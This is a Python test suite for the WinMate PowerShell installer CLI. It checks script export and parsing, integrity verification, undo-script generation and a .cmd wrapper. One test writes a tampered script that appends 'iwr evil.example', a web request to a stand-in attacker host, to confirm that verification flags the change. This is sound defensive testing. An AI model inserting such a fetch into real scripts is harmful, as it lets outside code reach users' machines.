#!/usr/bin/env python3
"""Tests for the PowerShell engine and the winmate.ps1 CLI (Windows only).

Uses the built files in dist/ (run `python build.py` first):
  - exports scripts for every package manager and mode and parses them with the PowerShell parser
  - checks winmate.ps1 -Verify: unmodified script passes, tampered script fails, foreign file is rejected
  - generates an undo script (engine self-test) and verifies that it still contains the untouched engine
  - checks the .cmd double-click wrapper
With --run it additionally executes safe runs that change nothing:
  - a dry run for real catalog apps
  - an install run for an already up-to-date package and a non-existent package (both marked NoAdmin,
    so no administrator prompt appears), plus the phase flow that the elevated window uses

Usage: python tools/test_script.py [--run]
"""
import json
import os
import re
import subprocess
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
DIST = ROOT / "dist"
CLI = DIST / "winmate.ps1"
FAILURES = []


# Run records and logs of test runs go to a temporary folder instead of the real %LOCALAPPDATA%\WinMate.
TEST_ENV = dict(os.environ, LOCALAPPDATA=tempfile.mkdtemp(prefix="winmate-localappdata-"))


def ps(command, timeout=900):
    return subprocess.run(["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", command],
                          capture_output=True, text=True, timeout=timeout, encoding="utf-8", errors="replace", env=TEST_ENV)


def cli(args, timeout=900):
    return ps(f"& '{CLI}' {args}; exit $LASTEXITCODE", timeout)


def check(name, condition, detail=""):
    print(f"{'OK  ' if condition else 'FAIL'}  {name}{'' if condition else '  ' + detail[-1500:]}")
    if not condition:
        FAILURES.append(name)


def parse_errors(path):
    r = ps(f"$e=$null; [void][System.Management.Automation.Language.Parser]::ParseFile('{path}', [ref]$null, [ref]$e); "
           "$e | ForEach-Object { $_.ToString() }")
    return r.stdout.strip()


def cmd_wrapper(text):
    # Mirror of cmdWrapper() in src/js/app.js
    head = "\n".join([
        "<# :", "@echo off", "setlocal", "title WinMate installer", 'set "WM_SELF=%~f0"',
        'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$s=[IO.File]::ReadAllText($env:WM_SELF); & ([ScriptBlock]::Create($s))"',
        "exit /b %errorlevel%", "#>", "",
    ])
    return (head + text).replace("\r\n", "\n").replace("\n", "\r\n")


def replace_apps(text, entries):
    """Swap the $Apps list of an exported script for test entries."""
    block = "    $Apps = @(\n" + "\n".join(f"        @{{ {e} }}" for e in entries) + "\n    )"
    return re.sub(r"(?s)    \$Apps = @\(\n.*?\n    \)", lambda m: block, text, count=1)


def main():
    if not CLI.exists():
        print("dist/winmate.ps1 not found - run python build.py first")
        return 2
    tmp = Path(tempfile.mkdtemp(prefix="winmate-test-"))
    info = json.loads((DIST / "build-info.json").read_text(encoding="utf-8"))

    r = cli("-Version")
    check("winmate.ps1 -Version and embedded engine hash", r.returncode == 0 and info["engineSha256"] in r.stdout, r.stdout + r.stderr)

    r = cli("-List -Search firefox")
    check("winmate.ps1 -List -Search", r.returncode == 0 and "firefox" in r.stdout, r.stdout + r.stderr)

    r = cli("-Apps does-not-exist -DryRun")
    check("unknown app is rejected", r.returncode == 1 and "Unknown app" in r.stdout, r.stdout + r.stderr)

    exports = {
        "winget-install": "-Apps firefox,whatsapp,spotify,vcredist -PinVersions -RestorePoint",
        "winget-dryrun": "-Bundle gaming -DryRun",
        "scoop-upgrade": "-Apps 7zip,vlc -PackageManager scoop -Mode upgrade",
        "choco-uninstall": "-Apps 7zip -PackageManager choco -Mode uninstall -Proxy http://proxy:8080",
    }
    for name, args in exports.items():
        out = tmp / f"{name}.ps1"
        r = cli(f"{args} -ExportScript '{out}'")
        check(f"export {name}", r.returncode == 0 and out.exists(), r.stdout + r.stderr)
        if out.exists():
            errors = parse_errors(out)
            check(f"parse {name}", not errors, errors)
            header = out.read_text(encoding="utf-8-sig").split("& {")[0]
            check(f"header of {name} is comments only", all(l.startswith("#") for l in header.strip().splitlines()), header)

    script = (tmp / "winget-install.ps1").read_text(encoding="utf-8-sig")
    check("pinned version in winget config", "Version = '" in script, script[:1500])
    r = cli(f"-Verify '{tmp / 'winget-install.ps1'}'")
    check("verify unmodified script", r.returncode == 0 and "OK" in r.stdout, r.stdout + r.stderr)

    tampered = tmp / "tampered.ps1"
    tampered.write_text(script.replace("$ErrorActionPreference = 'Continue'", "$ErrorActionPreference = 'Continue'; iwr evil.example"), encoding="utf-8")
    r = cli(f"-Verify '{tampered}'")
    check("verify detects a modified engine", r.returncode == 1 and "MISMATCH" in r.stdout, r.stdout + r.stderr)

    foreign = tmp / "foreign.ps1"
    foreign.write_text("Write-Host 'hello'\n", encoding="utf-8")
    r = cli(f"-Verify '{foreign}'")
    check("verify rejects a file without engine", r.returncode == 2, r.stdout + r.stderr)

    # Undo script generation (engine self-test phase).
    undo = tmp / "undo.ps1"
    selftest = tmp / "selftest.ps1"
    selftest.write_text(script.rstrip()[:-1] + f"}} -Phase 'selftest' -ResultFile '{undo}'\n", encoding="utf-8-sig")
    r = ps(f"& '{selftest}'")
    check("undo script generated", undo.exists(), r.stdout + r.stderr)
    if undo.exists():
        undo_text = undo.read_text(encoding="utf-8")
        check("undo script uses uninstall mode", "$Mode = 'uninstall'" in undo_text and "$RestorePoint = $false" in undo_text, undo_text[:1500])
        check("undo script keeps no pinned versions", "Version = '" not in undo_text.split("# <<< config")[0], undo_text[:1500])
        errors = parse_errors(undo)
        check("parse undo script", not errors, errors)
        r = cli(f"-Verify '{undo}'")
        check("undo script contains the unmodified engine", r.returncode == 0, r.stdout + r.stderr)

    js = next((DIST / "js").glob("app.*.js")).read_text(encoding="utf-8")
    check("website generator uses the same markers", all(m in js for m in ("# >>> config", "# <<< config", "# >>> engine", "# <<< engine", info["engineSha256"])))

    if "--run" in sys.argv:
        r = cli("-Apps 7zip,firefox -DryRun -NoPause")
        check("CLI dry run", r.returncode == 0 and "Dry run finished" in r.stdout, r.stdout + r.stderr)

        base = (tmp / "winget-install.ps1").read_text(encoding="utf-8-sig")
        run = replace_apps(base, ["Name = 'VC++ 2012 x64'; Id = 'Microsoft.VCRedist.2012.x64'; NoAdmin = $true",
                                  "Name = 'Does not exist'; Id = 'WinMate.DoesNotExist'; NoAdmin = $true"])
        run = run.replace("$RestorePoint = $true", "$RestorePoint = $false")
        main_file = tmp / "run-main.ps1"
        main_file.write_text(run.rstrip()[:-1] + "} -NoPause -RunId 'test-main'\n", encoding="utf-8-sig")
        r = ps(f"& '{main_file}'")
        check("main flow: up-to-date package and missing package", "already up to date" in r.stdout and "[FAILED]" in r.stdout, r.stdout + r.stderr)

        result = tmp / "result.json"
        phase_file = tmp / "run-phase.ps1"
        phase_file.write_text(run.rstrip()[:-1] + f"}} -Phase 'user' -ResultFile '{result}' -RunId 'test-phase'\n", encoding="utf-8-sig")
        ps(f"& '{phase_file}'")
        statuses = [d["Status"] for d in json.loads(result.read_text(encoding="utf-8-sig"))] if result.exists() else []
        check("phase flow result file", statuses == ["uptodate", "failed"], str(statuses))

        cmd = tmp / "WinMate-Install.cmd"
        cmd.write_text(cmd_wrapper(run.replace("[switch]$NoPause,", "[switch]$NoPause = $true,")), encoding="utf-8")
        r = subprocess.run(["cmd.exe", "/c", str(cmd)], capture_output=True, text=True, timeout=900, encoding="utf-8", errors="replace", env=TEST_ENV)
        check(".cmd wrapper runs the script", "Summary" in r.stdout, r.stdout + r.stderr)

        r = cli("-Logs")
        check("winmate.ps1 -Logs lists runs", r.returncode == 0 and "Latest run" in r.stdout, r.stdout + r.stderr)

    print(f"\n{'ALL OK' if not FAILURES else str(len(FAILURES)) + ' FAILURE(S): ' + ', '.join(FAILURES)}")
    return 1 if FAILURES else 0


if __name__ == "__main__":
    sys.stdout.reconfigure(encoding="utf-8")
    sys.exit(main())
